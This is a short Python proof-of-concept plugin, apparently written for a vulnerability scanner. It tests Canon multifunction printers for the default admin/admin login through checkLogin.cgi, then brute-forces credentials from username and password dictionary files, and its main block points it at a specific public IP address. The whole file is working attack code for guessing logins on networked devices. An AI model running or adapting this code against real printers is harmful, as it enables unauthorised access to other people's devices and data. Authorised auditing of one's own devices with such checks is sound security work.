#!/usr/bin/env python
# -*- coding: utf-8 -*-
"""
POC Name  :  佳能一体机默认口令 weak pass
Author    :  a
mail      :  a@lcx.cc



 
"""


import urlparse
import time
import base64 

def assign(service, arg):
    if service == 'canon':
        arr = urlparse.urlparse(arg)
        return True, '%s://%s/' % (arr.scheme, arr.netloc)

def audit(arg):
    defaultpass = ['admin','admin']
    sdkpass = loadSDKWeakPassWd(arg)
    res ,code = weakPass(arg,defaultpass)
    if code ==0:
        return  
    if 'logout.cgi' in res and 'Standby AddressMain' in res and code == 200:
        security_hole(arg +'     user:%s pass:%s' % (defaultpass[0],defaultpass[1]))
    else:
        for l in sdkpass:
            res ,code = weakPass(arg,l)
            if 'logout.cgi' in res and 'Standby AddressMain' in res and code == 200:
                security_hole(arg +'     user:%s pass:%s' % (l[0],l[1])) 
                                
    
def weakPass(arg,list):
    url = arg + "checkLogin.cgi"
    data = 'iToken=&i0012=1&i0014=%s&i0016=%s&i0019=' %(list[0],list[1])
    code2, head, res, errcode, _ = curl.curl2(url ,data)
    code2, head, res, errcode, _ = curl.curl2(arg+'portal_top.html' )
    return  res ,code2
    
def loadSDKWeakPassWd(args):
    r = urlparse.urlparse(args)
    host = r.hostname
    sdklist = []
 
    pass_list = util.load_password_dict(
        host,
        userfile='database/http_user.txt', 
        passfile='database/http_pass.txt',
        userlist=None,
        passlist=None,
        mix=True,
        )
    sdklist = pass_list
    return sdklist
       

if __name__ == '__main__':
    from dummy import *
    audit(assign('canon','http://222.114.44.29/')[1])